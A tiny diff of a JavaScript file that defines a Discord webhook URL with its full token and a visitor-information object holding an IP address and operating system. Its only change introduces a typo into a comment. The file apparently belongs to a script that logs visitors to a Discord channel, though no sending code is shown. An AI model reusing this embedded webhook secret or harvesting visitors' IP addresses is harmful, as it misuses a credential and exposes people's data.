@@ -1,7 +1,7 @@
 // Discord Webhook URL
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1570794844572483676/7PAI4xda77SxJKrFcy8Kaf7YHdNe0h8t7oCsxprI_I7-pIO85tVbRgkxsXLYLq9oY5oc';
 
-// Visitor Information
+// Visitor Informatio
 const visitorInfo = {
   ipAddress: '31.187.78.186',
   os: 'Windows',
